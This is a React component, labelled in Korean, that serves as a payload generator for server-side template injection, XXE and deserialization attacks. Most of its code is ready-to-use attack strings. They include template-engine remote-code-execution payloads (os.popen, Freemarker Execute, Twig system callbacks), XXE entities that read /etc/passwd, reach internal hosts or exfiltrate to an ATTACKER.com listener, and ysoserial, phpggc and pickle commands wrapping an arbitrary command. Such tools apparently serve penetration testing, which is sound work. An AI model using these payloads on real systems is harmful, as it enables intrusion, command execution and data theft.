import { useState } from 'react'
import { DISCLAIMER, Note, Pick, Readout, TextInput, escapeSingleQuoted } from './shared'

type Engine = 'Jinja2' | 'Twig' | 'Freemarker' | 'Mako' | 'ERB'
const ENGINES: Engine[] = ['Jinja2', 'Twig', 'Freemarker', 'Mako', 'ERB']

const SSTI_PAYLOADS: Record<Engine, { label: string; payloads: { desc: string; code: string }[] }> = {
  Jinja2: {
    label: 'Jinja2 / Flask',
    payloads: [
      { desc: '기본 수식 평가', code: '{{7*7}}' },
      { desc: '전역 설정 접근', code: '{{config.items()}}' },
      { desc: '클래스 계층 탐색 (RCE)', code: '{{ self.__class__.mro()[1].__subclasses__() }}' },
      { desc: 'os.popen 실행 (cycler 경유 필터 우회)', code: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
    ],
  },
  Twig: {
    label: 'Twig / Symfony',
    payloads: [
      { desc: '기본 수식 평가', code: '{{7*7}}' },
      { desc: '필터 사용', code: '{{ "id"|upper }}' },
      { desc: 'RCE (register_shutdown_function)', code: '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}' },
    ],
  },
  Freemarker: {
    label: 'Freemarker',
    payloads: [
      { desc: '기본 수식 평가', code: '${7*7}' },
      { desc: 'RCE (Execute)', code: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
    ],
  },
  Mako: {
    label: 'Mako',
    payloads: [
      { desc: '기본 수식 평가', code: '${7*7}' },
      { desc: 'RCE', code: '${__import__("os").popen("id").read()}' },
    ],
  },
  ERB: {
    label: 'ERB / Ruby on Rails',
    payloads: [
      { desc: '기본 수식 평가', code: '<%= 7*7 %>' },
      { desc: 'RCE', code: '<%= `id` %>' },
    ],
  },
}

const XXE_PAYLOADS = [
  { id: 'file-read', label: '로컬 파일 읽기 (/etc/passwd)', code: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>' },
  { id: 'ssrf', label: '내부 서비스 SSRF', code: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://INTERNAL-HOST/endpoint">]>\n<root>&xxe;</root>' },
  { id: 'oob', label: 'OOB Exfiltration (외부 리스너)', code: '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n  <!ENTITY % file SYSTEM "file:///etc/hostname">\n  <!ENTITY % dtd SYSTEM "http://ATTACKER.com/out.dtd">\n  %dtd;\n]>\n<root>&send;</root>' },
]

const DESER_PAYLOADS_TEMPLATES = [
  { lang: 'Java', tool: 'ysoserial', payload: 'CommonsCollections1', cmd: (c: string) => `java -jar ysoserial.jar CommonsCollections1 "${c}" > payload.bin` },
  { lang: 'Java', tool: 'ysoserial', payload: 'CommonsBeanutils1', cmd: (c: string) => `java -jar ysoserial.jar CommonsBeanutils1 "${c}" > payload.bin` },
  { lang: 'PHP', tool: 'phpggc', payload: 'Monolog', cmd: (c: string) => `phpggc Monolog system "${c}"` },
  { lang: 'Python', tool: 'pickle', payload: 'os.system', cmd: (c: string) => `python3 -c "import pickle, os; print(pickle.dumps(lambda: os.system('${escapeSingleQuoted(c)}')))"` },
]

export function AdvancedPayloadBuilder() {
  const [tab, setTab] = useState<'ssti' | 'xxe' | 'deser'>('ssti')
  const [engine, setEngine] = useState<Engine>('Jinja2')
  const [collabUrl, setCollabUrl] = useState('')
  const [deserCmd, setDeserCmd] = useState('id')

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      
      <div className="payload-builder-tabs">
        <button className={tab === 'ssti' ? 'active' : ''} onClick={() => setTab('ssti')}>SSTI</button>
        <button className={tab === 'xxe' ? 'active' : ''} onClick={() => setTab('xxe')}>XXE</button>
        <button className={tab === 'deser' ? 'active' : ''} onClick={() => setTab('deser')}>역직렬화</button>
      </div>

      {tab === 'ssti' && (
        <div className="payload-builder-content">
          <Pick label="템플릿 엔진" value={engine} onChange={setEngine} options={ENGINES.map(id => ({ id, label: SSTI_PAYLOADS[id].label }))}/>
          <div className="payload-readout-group">
            {SSTI_PAYLOADS[engine].payloads.map((p, i) => (
              <Readout key={i} title={p.desc} value={p.code} />
            ))}
          </div>
        </div>
      )}

      {tab === 'xxe' && (
        <div className="payload-builder-content">
          <TextInput label="외부 리스너 URL (OOB용)" value={collabUrl} onChange={setCollabUrl} placeholder="http://attacker.com" />
          <div className="payload-readout-group">
            {XXE_PAYLOADS.map((p, i) => (
              <Readout key={i} title={p.label} value={p.code.replace('ATTACKER.com', collabUrl || 'ATTACKER.com')} />
            ))}
          </div>
        </div>
      )}

      {tab === 'deser' && (
        <div className="payload-builder-content">
          <TextInput label="실행 명령" value={deserCmd} onChange={setDeserCmd} placeholder="id" />
          <p className="payload-builder-hint">역직렬화 페이로드는 바이너리 형태로 생성되므로, 도구 사용법과 가젯 체인 레퍼런스를 제공합니다.</p>
          <div className="payload-readout-group">
            {DESER_PAYLOADS_TEMPLATES.map((p, i) => (
              <Readout key={i} title={`${p.lang} (${p.tool} - ${p.payload})`} value={p.cmd(deserCmd)} />
            ))}
          </div>
        </div>
      )}
    </div>
  )
}

export default AdvancedPayloadBuilder
